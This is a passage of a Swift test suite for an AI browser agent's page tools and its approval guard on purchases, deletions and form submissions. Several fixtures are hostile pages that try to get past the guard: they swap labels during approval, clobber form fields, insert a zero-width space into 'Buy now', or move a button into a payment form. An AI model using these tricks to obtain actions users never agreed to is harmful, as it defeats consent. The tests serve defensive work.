            #expect(await waitUntil { tab.title == "extra used" }, "the new element works")

            let checked = await call(tab, "click", ["element_id": bacon])
            #expect(changes(checked.text, "~").first?.contains("[\(bacon)] input[checkbox] \"Bacon\": now [checked]") == true, Comment(rawValue: checked.text))
            let typed = await call(tab, "type_text", ["element_id": name, "text": "Bob"])
            let change = try #require(changes(typed.text, "~").first { $0.contains("\"Name\"") })
            #expect(change.contains("value (empty) → \"Bob\"") && change.contains("now [focused]"), "\(change)")
            let again = await call(tab, "type_text", ["element_id": name, "text": "Bobby"])
            let second = try #require(changes(again.text, "~").first { $0.contains("\"Name\"") })
            #expect(second.contains("value \"Bob\" → \"Bobby\"") && !second.contains("focused"), "against the latest report")
            let filled = await call(tab, "click", ["element_id": fill])
            #expect(!filled.text.contains("hunter") && !filled.text.contains("Secret"), Comment(rawValue: "a secret's value is never told: \(filled.text)"))
        }

        @Test func aToolWithoutATabIdWorksOnTheTabAQueuedMessageWasWrittenForOrAsksTheAIToSayWhich() async throws {
            let (tab, window, browser) = try await page("<body><h1>Written for</h1><button>Hi</button></body>")
            defer { window.close(); browser.windowClosed(); ChatStore.shared.reset() }
            let other = browser.openTab(url: nil)
            let chat = ChatStore.shared
            chat.launch = { _, _ in true }
            defer { chat.launch = nil }
            func ask() async -> (text: String, failed: Bool) {
                let result = await Approvals.$stand.withValue(Approvals.Stand { _ in .once }) { await ToolCatalog.call("read_page", [:], caller: ChatStore.caller) }
                return (result.content.compactMap { $0["text"] as? String }.joined(separator: "\n"), result.isError)
            }
            browser.activate(other.id)
            chat.submit("start")
            // Written while the page was in front, sent when another is.
            browser.activate(tab.id)
            chat.submit("about the page")
            browser.activate(other.id)
            chat.endRun()
            #expect(chat.runDefaultTab == .tab(tab.id))
            let read = await ask()
            #expect(!read.failed && read.text.contains("Written for"), Comment(rawValue: "the tab it was written for, not the one in front: \(read.text)"))
            // The next message waits while the page is in front too, but the page has gone to another site when it is sent.
            chat.endRun()
            chat.submit("start again")
            browser.activate(tab.id)
            chat.submit("about the page again")
            tab.url = URL(string: "https://elsewhere.example/")
            chat.endRun()
            #expect(chat.runDefaultTab == .none)
            let refused = await ask()
            #expect(refused.failed && refused.text.contains("list_tabs") && !refused.text.contains("Written for"), Comment(rawValue: refused.text))
        }

        @Test func anElementThatLeftAndComesBackIsNewAgainWithANumberThatWorks() async throws {
            let html = """
                <body><button id=toggle onclick="const m = document.getElementById('menu'); m.style.display = m.style.display === 'none' ? 'block' : 'none'">Toggle menu</button>
                <div id=menu style="display:none"><button onclick="document.title = 'item used'">Item A</button></div></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let toggle = try #require(id(of: "Toggle menu", in: read))
            let opened = await call(tab, "click", ["element_id": toggle])
            let first = try #require(changes(opened.text, "+").first { $0.contains("\"Item A\"") }.flatMap { number(of: $0.dropFirst(2)) }, Comment(rawValue: opened.text))
            let closed = await call(tab, "click", ["element_id": toggle])
            #expect(changes(closed.text, "-").contains { $0.contains("[\(first)]") && $0.contains("\"Item A\"") }, Comment(rawValue: closed.text))
            let again = await call(tab, "click", ["element_id": toggle])
            let second = try #require(changes(again.text, "+").first { $0.contains("\"Item A\"") }.flatMap { number(of: $0.dropFirst(2)) }, Comment(rawValue: "the same node is reported as new again: \(again.text)"))
            #expect(second > first, "with a number of its own")
            #expect(!(await call(tab, "click", ["element_id": second])).failed)
            #expect(await waitUntil { tab.title == "item used" }, "that works")
        }

        @Test func theAddressAndTitleThatChangedAreToldWithTheChange() async throws {
            let html = "<body><button onclick=\"history.pushState({}, '', '/next'); document.title = 'Next page'\">Go on</button></body>"
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let result = await call(tab, "click", ["element_id": try #require(id(of: "Go on", in: read))])
            #expect(result.text.contains("URL: https://lab.test/ → https://lab.test/next") && result.text.contains("Title: ") && result.text.contains("→ Next page"), Comment(rawValue: result.text))
            let second = await call(tab, "hover", ["element_id": try #require(id(of: "Go on", in: read))])
            #expect(!second.text.contains("URL:") && second.text.contains("No interactive element changed"), "what was told is the new baseline")
        }

        @Test func moreChangesThanTheCapAreCountedAndTheRestIsLeftToAReadOfThePage() async throws {
            let html = "<body><button onclick=\"for (let i = 0; i < 60; i++) { const b = document.createElement('button'); b.textContent = 'Item ' + i; document.body.append(b) }\">Many</button></body>"
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let result = await call(tab, "click", ["element_id": try #require(id(of: "Many", in: read))])
            // 60 new elements: the cap's worth are told, and the rest is counted whatever else the click changed (the button took the focus).
            let rest = try #require(result.text.range(of: #"\((\d+) more changes"#, options: .regularExpression).flatMap { Int(result.text[$0].filter(\.isNumber)) })
            #expect(changes(result.text, "+").count == ToolCatalog.maxChangeLines && rest == 60 - ToolCatalog.maxChangeLines, Comment(rawValue: result.text))
            let later = await call(tab, "read_page").text
            #expect(later.contains("\"Item 59\""), "a read still gives them all")
        }

        @Test func aNavigationIsSaidSoAndNoPageWasReadMeansNoChangesToTell() async throws {
            let server = try await TinyServer { _, path in
                path == "/two" ? "<body><h1>Two</h1><button>Back here</button></body>" : "<body><a id=l href=\"/two\">To two</a></body>"
            }
            defer { server.stop() }
            let browser = Browser()
            browser.focused()
            defer { browser.windowClosed() }
            let tab = browser.openTab(url: nil)
            let view = tab.wake()
            let window = OffscreenWindow(view)
            defer { window.close() }
            view.load(URLRequest(url: server.url("/one")))
            #expect(await waitUntil { !view.isLoading && view.url?.path == "/one" })
            let unread = await call(tab, "click_at", ["x": 400, "y": 400])
            #expect(unread.text.contains("this page was not read before") && !unread.text.contains("+ ["), Comment(rawValue: unread.text))
            let read = await call(tab, "read_page").text
            let result = await call(tab, "click", ["element_id": try #require(id(of: "To two", in: read))])
            #expect(await waitUntil { view.url?.path == "/two" })
            #expect(result.text.contains("the page navigated. Read the page (read_page)") && !result.text.contains("+ ["), Comment(rawValue: result.text))
        }

        @Test func changesInAFrameOfAnotherSiteAreToldAndCountAsReadFromThatSite() async throws {
            // The frame shows its button when the page tells it to (a message), not after a time: the test says when.
            let inner = "<script>addEventListener('message', e => { if (e.data === 'show') { document.body.innerHTML = '<button>Late</button>'; parent.postMessage('shown', '*') } })</script>"
            let html = "<body><script>addEventListener('message', e => { if (e.data === 'shown') window.shown = true })</script><button id=go>Go</button><iframe sandbox='allow-scripts' style='width:300px;height:100px' srcdoc=\"\(inner)\"></iframe></body>"
            let (tab, window, browser) = try await page(html, host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .once }) { stand in
                var read = ""
                for _ in 0..<100 where tab.agent.frames.known.isEmpty {
                    read = await call(tab, "read_page", caller: "mcp-frame").text
                    if tab.agent.frames.known.isEmpty { try await Task.sleep(for: .milliseconds(50)) }
                }
                #expect(!read.contains("Late"), "the frame showed nothing when it was read: \(read)")
                #expect(stand.asked.isEmpty)
                _ = await evaluate(tab, "document.querySelector('iframe').contentWindow.postMessage('show', '*'); return 'ok'")
                // The frame tells the page when it has shown it (nothing here reads the frame, which would count as a read of its site).
                var shown = false
                for _ in 0..<200 where !shown {
                    shown = await evaluate(tab, "return String(window.shown === true)") == "true"
                    if !shown { try await Task.sleep(for: .milliseconds(25)) }
                }
                #expect(shown, "the frame shows it now")
                let go = try #require(id(of: "Go", in: read))
                let result = await call(tab, "click", ["element_id": go], caller: "mcp-frame")
                let late = try #require(changes(result.text, "+").first, Comment(rawValue: result.text))
                #expect(late.contains("button \"Late\"") && late.hasSuffix("(in a frame of another site)"), Comment(rawValue: late))
                let number = try #require(number(of: late.dropFirst(2)))
                #expect(stand.asked.isEmpty, "nothing was asked: the frame had not been read from before")
                // What the frame told is read from a site of its own, so using the page asks now, and the new element works.
                let next = await call(tab, "click", ["element_id": number], caller: "mcp-frame")
                #expect(!next.failed && stand.asked.filter { $0.message.contains("this page") || $0.message.contains("outer.test") }.count >= 1, "\(next.text) \(stand.asked.map(\.message))")
                // A frame that did not answer is left alone for a while, and the report says so instead of waiting for it.
                let slot = try #require(tab.agent.frames.known.first?.slot)
                tab.agent.hung[slot] = Date()
                let skipped = await call(tab, "hover", ["element_id": go], caller: "mcp-frame")
                #expect(skipped.text.contains("1 frame from another site did not answer in time"), Comment(rawValue: skipped.text))
            }
        }

        @Test func aChangeOfTheFocusAloneIsToldLastAndTakesNoLineOfTheBudget() async throws {
            let html = """
                <body><button id=go onclick="for (let i = 0; i < 45; i++) { const b = document.createElement('button'); b.textContent = 'Item ' + i; document.body.append(b) }">Go</button>
                <input id=a placeholder="Alpha"><input id=b placeholder="Beta"><script>document.getElementById('a').focus()</script></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let result = await call(tab, "click", ["element_id": try #require(id(of: "Go", in: read))])
            let lines = result.text.split(separator: "\n").map(String.init)
            #expect(changes(result.text, "+").count == ToolCatalog.maxChangeLines, Comment(rawValue: result.text))
            let focus = lines.indices.filter { lines[$0].hasPrefix("~ ") && lines[$0].contains("focused") }
            #expect(focus.count == 2, "the button took the focus and the field lost it: \(focus)")
            #expect(focus.allSatisfy { index in lines[..<index].filter { $0.hasPrefix("+ ") }.count == ToolCatalog.maxChangeLines }, "after all the new ones")
            #expect(result.text.contains("(5 more changes"), "the five that did not fit are counted, and the focus lines took none of the room: \(result.text)")
        }

        @Test func nothingChangedSaysSoAndThatThePageMayStillBeLoading() async throws {
            let (tab, window, browser) = try await page("<body><button id=a>Same</button></body>")
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let id = try #require(id(of: "Same", in: read))
            _ = await call(tab, "hover", ["element_id": id])
            let quiet = await call(tab, "hover", ["element_id": id])
            #expect(quiet.text.contains("No interactive element changed yet; the page may still be loading — use wait_for if you expect more."), Comment(rawValue: quiet.text))
        }

        @Test func elementsBeyondTheLimitOfOneDocumentDontMakeTheNextDocumentsElementsNewLater() async throws {
            // The first document has more elements than are looked at past the list's limit; the frame's are all beyond the limit too.
            let inner = "<script>for (let i = 0; i < 300; i++) { const b = document.createElement('button'); b.textContent = 'Inner ' + i; document.body.append(b) }</script>"
            let html = "<body><button id=hover>Hover me</button><script>for (let i = 0; i < 1800; i++) { const b = document.createElement('button'); b.textContent = 'Outer ' + i; document.body.append(b) }</script><iframe style='width:300px;height:100px' srcdoc=\"\(inner)\"></iframe></body>"
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let id = try #require(id(of: "Hover me", in: read))
            let result = await call(tab, "hover", ["element_id": id])
            #expect(changes(result.text, "+").isEmpty && !result.text.contains("more changes"), Comment(rawValue: String(result.text.prefix(600))))
        }

        @Test func anOptionIsJudgedByWhatItResolvesToNotByTheWordsAskedFor() async throws {
            let html = """
                <body><select id=acct onchange="document.title='changed ' + this.value"><option>Profile</option><option>Delete account</option></select>
                <div role=combobox id=cb aria-label="Actions" aria-controls=lb tabindex=0 onclick="document.title='opened';document.getElementById('lb').style.display='block'">Pick</div>
                <div role=listbox id=lb style="display:none"><div role=option onclick="document.title='kept'">Keep it</div><div role=option onclick="document.title='wiped'">Erase it</div></div>
                <div role=combobox id=cb2 aria-label="Delete menu" aria-controls=lb2 tabindex=0 onclick="document.title='opened2';document.getElementById('lb2').style.display='block'">Menu</div>
                <div role=listbox id=lb2 style="display:none"><div role=option onclick="document.title='fine'">Fine</div></div></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ prompt in Self.isHigh(prompt) ? .deny : .once }) { stand in
                let read = await call(tab, "read_page").text
                let select = try #require(id(ofKind: "select", in: read))
                // "Account" names one option, whose text is "Delete account": asked about by that, and refused.
                let refused = await call(tab, "select_option", ["element_id": select, "option": "Account"])
                #expect(refused.failed && refused.text.contains("declined"))
                #expect(guarded(stand).count == 1 && guarded(stand)[0].detail.contains("Delete account"))
                #expect(await evaluate(tab, "return document.getElementById('acct').value") == "Profile", "nothing was chosen")
                // An option that is only an option is chosen without the guard.
                #expect(!(await call(tab, "select_option", ["element_id": select, "option": "Profile"])).failed)
                #expect(guarded(stand).count == 1)

                // A list that must be opened first: the opening is a click, judged by the list's own name, and so is the option.
                let combo = try #require(id(of: "Actions", in: read))
                let wipe = await call(tab, "select_option", ["element_id": combo, "option": "Erase"])
                #expect(wipe.failed && wipe.text.contains("declined"))
                #expect(guarded(stand).count == 2 && guarded(stand)[1].detail.contains("Erase it"))
                #expect(await evaluate(tab, "return document.title") != "wiped")
                let keep = await call(tab, "select_option", ["element_id": combo, "option": "Keep"])
                #expect(!keep.failed)
                #expect(await waitUntil { tab.title == "kept" })

                let menu = try #require(id(of: "Delete menu", in: read))
                let opening = await call(tab, "select_option", ["element_id": menu, "option": "Fine"])
                #expect(opening.failed && guarded(stand).count == 3 && guarded(stand)[2].detail.contains("Delete menu"))
                #expect(await evaluate(tab, "return document.getElementById('lb2').style.display") != "block", "the refused opening click didn't happen")
            }
        }

        @Test func aChosenOptionIsOnlyChosenIfItIsStillWhatWasJudged() async throws {
            let html = """
                <body><div role=combobox id=cb aria-label="Actions" aria-controls=lb tabindex=0 onclick="document.getElementById('lb').style.display='block'">Pick</div>
                <div role=listbox id=lb style="display:none"><div id=opt role=option onclick="document.title='chosen ' + this.textContent">Erase it</div></div></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            // The option is asked about as the destructive thing it says it is; while the user thinks, the page swaps its words.
            try await asking({ prompt in
                if Self.isHigh(prompt) { tab.webView?.evaluateJavaScript("document.getElementById('opt').textContent='Keep it'") }
                return .once
            }) { stand in
                let read = await call(tab, "read_page").text
                let combo = try #require(id(of: "Actions", in: read))
                let result = await call(tab, "select_option", ["element_id": combo, "option": "Erase"])
                #expect(guarded(stand).count == 1 && guarded(stand)[0].detail.contains("Erase it"))
                #expect(result.failed && result.text.contains("changed"), "\(result.text)")
                #expect(!tab.title.hasPrefix("chosen"), "the option was not clicked")
            }
        }

        @Test func keysReachThePageWithTheEventsOfAKeyboard() async throws {
            let (tab, window, browser) = try await page(Self.form)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let field = try #require(id(of: "Fruit", in: read))
            let down = await call(tab, "press_key", ["key": "ArrowDown", "element_id": field])
            #expect(!down.failed && down.text.contains("Pressed ArrowDown"))
            #expect(!(await call(tab, "press_key", ["key": "Enter", "modifiers": ["shift"]])).failed)
            let log = (await call(tab, "read_page")).text
            #expect(log.contains("keydown:ArrowDown:40;keyup:ArrowDown:40;"))
            #expect(log.contains("keydown:Enter:13:shift;keypress:Enter:13:shift;"))
            #expect((await call(tab, "press_key", ["key": "x"])).failed)
        }

        @Test func aPressOfEnterOnAButtonThatLooksLikeBuyingIsAskedAboutAndCanBeRefused() async throws {
            let (tab, window, browser) = try await page(Self.form)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                let buy = try #require(id(of: "Buy now", in: read)), cart = try #require(id(of: "Add to cart", in: read))
                let refused = await call(tab, "press_key", ["key": "Enter", "element_id": buy])
                #expect(refused.failed && refused.text.contains("declined"))
                #expect(guarded(stand).count == 1 && guarded(stand)[0].detail.contains("Buy now"))
                let clickRefused = await call(tab, "click", ["element_id": buy])
                #expect(clickRefused.failed && guarded(stand).count == 2)

                stand.answer = { _ in .once }
                #expect(!(await call(tab, "click", ["element_id": cart])).failed)
                #expect(guarded(stand).count == 2, "adding to a cart is not asked about")
                #expect(await waitUntil { tab.title == "carted" })
                #expect(tab.title != "bought", "the refused clicks did nothing")
                #expect(!(await call(tab, "click", ["element_id": buy])).failed)
                #expect(guarded(stand).count == 3)
                #expect(await waitUntil { tab.title == "bought" })
            }
        }

        @Test func everyNameAControlHasCountsNotJustWhatItSays() async throws {
            let html = """
                <body style="margin:0">
                <button id=a aria-label="Delete everything">Close</button>
                <button id=b><img alt="Delete" width=8 height=8 src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></button>
                <button id=c title="Send message"><span style="display:inline-block;width:10px;height:10px;background:red"></span></button>
                <button id=d class="btn btn-delete"><span style="display:inline-block;width:10px;height:10px;background:red"></span></button>
                <button id=e>Bu&#8203;y now</button>
                <button id=f>OK</button>
                <button id=g class="icon chevron"><span style="display:inline-block;width:10px;height:10px;background:red"></span></button>
                <button id=h aria-labelledby="lbl">Menu</button><span id=lbl>Remove everything</span>
                <a id=i href="/account/delete?now=1"><span style="display:inline-block;width:10px;height:10px;background:red"></span></a>
                </body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                let ids = read.split(separator: "\n").filter { $0.hasPrefix("[") && ($0.contains("] button ") || $0.contains("] a ")) }.compactMap(number)
                #expect(ids.count == 9)
                var asked: [Bool] = []
                for element in ids {
                    let before = guarded(stand).count
                    _ = await call(tab, "click", ["element_id": element])
                    asked.append(guarded(stand).count > before)
                }
                #expect(asked == [true, true, true, true, true, false, false, false, true], "\(asked)")
                #expect(consent(stand).count == 1 && consent(stand)[0].detail.contains("Remove everything"), "a name by aria-labelledby is a consent or a setting, not a loss")
            }
        }

        @Test func ordinaryLinksLabelsAndFieldsAreNotAskedAboutButWhereAControlGoesIs() async throws {
            let box = "display:inline-block;width:12px;height:12px;background:red"
            let html = """
                <body style="margin:0">
                <a href="https://lab.test/#a">Best way to save money on your next order of books and more, with tips from readers across the country about cheap shelves, used bookshops, library sales, swaps, and the very best second-hand finds of the year</a>
                <a href="https://lab.test/#b">게시판</a>
                <a href="https://lab.test/#c"><b>Card title</b> <button type=button onclick="document.title='saved'">Save</button></a>
                <label><input type=checkbox> Save my info</label>
                <label for=on>Order number</label><input id=on>
                <form><select id=sel><option>Orders</option><option>Order by price</option></select></form>
                <a href="https://lab.test/#d">Orders</a>
                <a href="/account/delete/confirm">Continue</a>
                <button type=button name=action value=delete>Go</button>
                <form action="/account/delete" onsubmit="return false"><button>Next</button></form>
                <button type=button><svg width=12 height=12><use href="#trash"/></svg></button>
                <button type=button><img width=12 height=12 src="https://lab.test/icons/trash.svg"></button>
                <button type=button style="width:12px;height:12px;background:url(https://lab.test/img/bin-icon.png)"></button>
                <button type=button>Allow</button>
                <button type=button>Accept</button>
                <button type=button><span style="\(box)"></span></button>
                </body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                let lines = read.split(separator: "\n").filter { $0.hasPrefix("[") && !$0.contains("--- ") }
                @MainActor func asks(_ line: Substring) async -> IrreversibleAction.Tier {
                    let before = (guarded(stand).count, consent(stand).count)
                    if line.contains("] select ") {
                        _ = await call(tab, "select_option", ["element_id": number(of: line) ?? 0, "option": "Orders"])
                        _ = await call(tab, "select_option", ["element_id": number(of: line) ?? 0, "option": "Order by price"])
                    } else {
                        _ = await call(tab, "click", ["element_id": number(of: line) ?? 0])
                    }
                    return guarded(stand).count > before.0 ? .high : consent(stand).count > before.1 ? .low : .none
                }
                var results: [(line: String, asked: IrreversibleAction.Tier)] = []
                for line in lines { results.append((String(line.drop { $0 != " " }), await asks(line))) }
                func asked(_ part: String) -> IrreversibleAction.Tier? { results.first { $0.line.contains(part) }?.asked }
                #expect(asked("Best way to save") == IrreversibleAction.Tier.none, "a headline link is never asked about: \(results)")
                #expect(asked("게시판") == IrreversibleAction.Tier.none)
                #expect(asked("Card title") == IrreversibleAction.Tier.none, "a card is not named after the button on it")
                #expect(asked("\"Save\"") == .low, "the button on it is, as a save")
                #expect(asked("Save my info") == IrreversibleAction.Tier.none, "a checkbox is named by what it holds")
                #expect(asked("Order number") == IrreversibleAction.Tier.none)
                #expect(asked("select") == .high, "the options of a list in a form are judged by their names too")
                #expect(asked(" a \"Orders\"") == IrreversibleAction.Tier.none, "a link to the orders is a navigation")
                #expect(asked("Continue") == .high, "where the link goes: a whole segment of its path")
                #expect(asked("\"Go\"") == .high, "a button's name and value")
                #expect(asked("\"Next\"") == .high, "the form it submits")
                #expect(asked("\"Allow\"") == .high && asked("\"Accept\"") == .high, "outside a cookie banner they grant something")
                let icons = results.filter { $0.line.hasPrefix(" button \"\"") }.map(\.asked)
                #expect(icons == [.high, .high, .high, .none], "the three icons by the picture they show, not the one with nothing: \(results)")
            }
        }

        @Test func anElementClickedByItsPlaceIsJudgedByTheControlItBelongsTo() async throws {
            let html = """
                <body style="margin:0"><div style="position:absolute;left:100px;top:50px;width:160px;height:40px;cursor:pointer" onclick="document.title='ordered'"><span style="display:block;margin:10px">Place order</span></div>
                <div style="position:absolute;left:100px;top:150px;width:300px;height:100px">Some words and also Buy and Delete, which are only text. <b>More</b></div>
                <button style="position:absolute;left:400px;top:400px" aria-label="Delete everything">x</button></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            await asking({ _ in .deny }) { stand in
                let refused = await call(tab, "click_at", ["x": 150, "y": 70])
                #expect(refused.failed && guarded(stand).count == 1 && guarded(stand)[0].detail.contains("Place order"))
                #expect(tab.title != "ordered")
                let text = await call(tab, "click_at", ["x": 150, "y": 160])
                #expect(!text.failed && guarded(stand).count == 1, "a box of text is not a button named after its words")
                let background = await call(tab, "click_at", ["x": 600, "y": 300])
                #expect(!background.failed && guarded(stand).count == 1, "nor is the page named after a button somewhere in it")
            }
        }

        @Test func enterInAFormWithNoSubmitButtonIsJudgedLikeTheSubmissionItIs() async throws {
            let html = """
                <body>
                <form id=f1 action="/checkout" onsubmit="document.title='checkout-sent';return false"><input placeholder="Email"></form>
                <form id=f2 action="/checkout" onsubmit="document.title='two-sent';return false"><input placeholder="Two A"><input placeholder="Two B"></form>
                <form id=f3 action="/search" onsubmit="document.title='search-sent';return false"><input placeholder="Query"></form>
                <form id=f4 action="/checkout" onsubmit="document.title='clobbered-sent';return false"><input name=action placeholder="Clobber"></form>
                <form id=f5 action="/next" onsubmit="document.title='card-sent';return false"><input placeholder="Holder"></form>
                <input form=f5 autocomplete="cc-number" placeholder="Card"><button form=f5>Continue</button>
                <form id=f6 action="/post" onsubmit="document.title='typed-sent';return false"><input placeholder="Typed"></form>
                <form id=f7 action="/checkout/confirm" onsubmit="document.title='area-sent';return false"><textarea placeholder="Area"></textarea></form>
                <form id=f8 action="/checkout" onsubmit="document.title='elements-sent';return false"><input name=elements placeholder="Clobber2"></form>
                </body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                @MainActor func enter(_ label: String) async throws -> Bool {
                    let before = guarded(stand).count
                    _ = await call(tab, "press_key", ["key": "Enter", "element_id": try #require(id(of: label, in: read))])
                    return guarded(stand).count > before
                }
                #expect(try await enter("Email"), "a form that posts to /checkout, with one field and no button")
                #expect(try await enter("Clobber"), "a field named action doesn't hide where the form goes")
                #expect(try await enter("Clobber2"), "nor does one named elements hide the form's fields")
                #expect(try await enter("Holder"), "Enter presses the form's default button, and the form has a card field that sits outside it")
                #expect(try await enter("Two A") == false, "Enter does nothing there")
                #expect(try await enter("Query") == false)
                // Typing with submit goes through any form, buttons or not.
                let before = guarded(stand).count
                _ = await call(tab, "type_text", ["element_id": try #require(id(of: "Typed", in: read)), "text": "x", "submit": true])
                #expect(guarded(stand).count == before, "a form that posts to /post is nothing special")
                _ = await call(tab, "type_text", ["element_id": try #require(id(of: "Area", in: read)), "text": "x", "submit": true])
                #expect(guarded(stand).count == before + 1, "the textarea sends, and that form posts to a checkout")
                // The button of a form with a card field that sits outside it.
                let cont = guarded(stand).count
                _ = await call(tab, "click", ["element_id": try #require(id(of: "Continue", in: read))])
                #expect(guarded(stand).count == cont + 1)
                #expect(guarded(stand).last?.detail.contains("Continue") == true)
                #expect(!["checkout-sent", "two-sent", "clobbered-sent", "card-sent", "area-sent", "elements-sent"].contains(await evaluate(tab, "return document.title")))
            }
        }

        @Test func typingIntoAMessageBoxAndPressingEnterIsAlwaysAsked() async throws {
            let html = """
                <body><textarea id=t placeholder="Message" onkeydown="if (event.key === 'Enter') { event.preventDefault(); document.title = 'sent ' + this.value }"></textarea>
                <div id=r contenteditable=true role=textbox aria-label="Compose" onkeydown="if (event.key === 'Enter') { event.preventDefault(); document.title = 'composed' }"></div></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                let area = try #require(id(of: "Message", in: read)), rich = try #require(id(of: "Compose", in: read))
                // Without Enter, typing into them is only typing.
                #expect(!(await call(tab, "type_text", ["element_id": area, "text": "hello"])).failed && guarded(stand).isEmpty)
                let sent = await call(tab, "type_text", ["element_id": area, "text": "hello", "submit": true])
                #expect(sent.failed && guarded(stand).count == 1)
                let composed = await call(tab, "type_text", ["element_id": rich, "text": "hello", "submit": true])
                #expect(composed.failed && guarded(stand).count == 2)
                #expect(tab.title != "sent hello" && tab.title != "composed")
                stand.answer = { _ in .once }
                #expect(!(await call(tab, "type_text", ["element_id": area, "text": "hello", "submit": true])).failed)
                #expect(await waitUntil { tab.title == "sent hello" })
            }
        }

        @Test func aPageThatChangesWhileTheUserThinksIsNotActedOn() async throws {
            let (tab, window, browser) = try await page(Self.form)
            defer { window.close(); browser.windowClosed() }
            // The button is what was asked about. While the question is open the page swaps its meaning.
            try await asking({ prompt in
                if Self.isHigh(prompt) { tab.webView?.evaluateJavaScript("document.getElementById('buy').setAttribute('aria-label', 'Something else'); document.getElementById('buy').textContent = 'Something else'") }
                return .once
            }) { stand in
                let read = await call(tab, "read_page").text
                let buy = try #require(id(of: "Buy now", in: read))
                let result = await call(tab, "click", ["element_id": buy])
                #expect(result.failed && result.text.contains("changed"), "\(result.text)")
                #expect(tab.title != "bought")
                #expect(guarded(stand).count == 1)
            }
            // An element that is gone is not clicked either.
            let read = await call(tab, "read_page").text
            let cart = try #require(id(of: "Add to cart", in: read))
            _ = await evaluate(tab, "document.getElementById('cart').replaceWith(document.getElementById('cart').cloneNode(true)); return 1")
            let gone = await call(tab, "click", ["element_id": cart])
            #expect(gone.failed && gone.text.contains("gone"))
        }

        /// Runs one of the app's page scripts as a tool does, in its own world.
        private func script(_ tab: Tab, _ source: String, _ arguments: [String: Any]) async -> String {
            guard let view = tab.webView else { return "" }
            return (try? await view.callAsyncJavaScript(source, arguments: arguments, in: nil, contentWorld: .defaultClient)).flatMap { "\($0)" } ?? ""
        }

        @Test func anActionStopsWhenWhatTheApprovalWasBasedOnChangedNotOnlyTheNames() async throws {
            let html = """
                <body><div id=step><button id=go type=button onclick="document.title='went'">Continue</button></div>
                <form id=f action="/next" onsubmit="document.title='sent';return false"><input placeholder="Name"><button id=sub>Continue</button></form>
                <select id=sel onchange="document.title='picked'"><option>Profile</option><option>Archive</option></select></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let lines = read.split(separator: "\n").filter { $0.contains("\"Continue\"") }
            let go = try #require(lines.first.flatMap(number)), sub = try #require(lines.last.flatMap(number))
            func facts(_ element: Int) async throws -> [String: Any] {
                let text = await script(tab, PageScripts.inspect, ["args": ["id": element]])
                return try #require((try? JSONSerialization.jsonObject(with: Data(text.utf8))) as? [String: Any], "\(text)")
            }
            func click(_ element: Int, expecting facts: [String: Any]) async -> String {
                await script(tab, PageScripts.click, ["args": ["id": element, "expect": ["origin": facts["origin"] ?? "", "fp": facts["fp"] ?? ""]]])
            }
            // The step becomes the payment step under the same button, while the user thinks.
            var before = try await facts(go)
            _ = await evaluate(tab, "const f = document.createElement('form'); f.action = '/pay'; f.innerHTML = '<input autocomplete=cc-number>'; document.body.append(f); f.append(document.getElementById('go')); return 1")
            var answer = await click(go, expecting: before)
            #expect(answer.contains("changed"), "a button that now sits in a payment form: \(answer)")
            #expect(await evaluate(tab, "return document.title") != "went")
            // A form whose address changes under a button that submits it.
            before = try await facts(sub)
            #expect(before["submits"] as? Bool == true)
            _ = await evaluate(tab, "document.getElementById('f').action = '/account/delete'; return 1")
            answer = await click(sub, expecting: before)
            #expect(answer.contains("changed"), "\(answer)")
            #expect(await evaluate(tab, "return document.title") != "sent")
            // The same button, unchanged, is clicked.
            before = try await facts(sub)
            #expect(await click(sub, expecting: before) == "ok")
            // A list that did not submit its form when it changed, and now does.
            let select = try #require(id(ofKind: "select", in: read))
            let resolved = await script(tab, PageScripts.selectOption, ["args": ["id": select, "option": "Archive", "stage": "resolve", "open": false]])
            let option = try #require((try? JSONSerialization.jsonObject(with: Data(resolved.utf8))) as? [String: Any], "\(resolved)")
            _ = await evaluate(tab, "const s = document.getElementById('sel'); const f = document.createElement('form'); f.action = '/checkout'; document.body.append(f); f.append(s); return 1")
            let chosen = await script(tab, PageScripts.selectOption, ["args": ["id": select, "option": "Archive", "stage": "choose", "expectFp": option["fp"] ?? ""]])
            #expect(chosen.contains("changed"), "\(chosen)")
            #expect(await evaluate(tab, "return document.getElementById('sel').value") == "Profile")
        }

        @Test func aListIsChosenFromOnlyWithSelectOptionNotByTypingOrArrowKeys() async throws {
            let html = """
                <body><select id=bulk onchange="document.title='ran ' + this.value"><option>Archive</option><option>Delete account</option></select>
                <input id=q placeholder="Fruit"></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let select = try #require(id(ofKind: "select", in: read)), field = try #require(id(of: "Fruit", in: read))
            let typed = await call(tab, "type_text", ["element_id": select, "text": "Delete account"])
